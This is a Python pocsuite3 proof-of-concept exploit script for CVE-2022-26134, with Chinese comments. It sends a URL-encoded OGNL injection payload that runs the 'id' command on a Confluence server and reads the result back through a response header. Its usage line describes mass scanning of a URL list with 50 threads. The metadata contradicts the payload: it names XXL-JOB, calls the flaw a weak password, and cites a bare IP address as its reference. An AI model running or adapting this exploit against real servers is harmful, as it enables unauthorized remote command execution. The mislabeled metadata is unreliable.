from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


# 关于类的继承
class XXLJOBPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "wang"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://106.52.3.78"]  # 漏洞地址来源,0day不用写
    name = "CVE-2022-26134 PoC"  # PoC 名称
    appPowerLink = "https://106.52.3.78"  # 漏洞厂商主页地址
    appName = "CVE-2022-26134"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """CVE-2022-26134远程命令执行漏洞。"""  # 漏洞简要描述
    pocDesc = """pocsuite -r pocsuite-CVE-2022-26134.py -f url.txt --save-file ./res.txt --threads 50"""  # POC用法描述

    def _check(self):
        result = []
        # 漏洞验证代码
        # self.url 就是你指定的-u 参数的值
        full_url = f"{self.url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        cookies = {"JSESSIONID": "DA45909165A17422FFB5275EEA52065C"}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document",
                   "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
        try:
            response = requests.post(full_url, headers=headers, cookies=cookies, allow_redirects=False, verify=False,
                                     timeout=5)
            if response.status_code == 302 and "X-Cmd-Response" in response.headers:
                result.append(self.url)
        except Exception as e:
            print(e)

        return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass


# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(XXLJOBPOC)
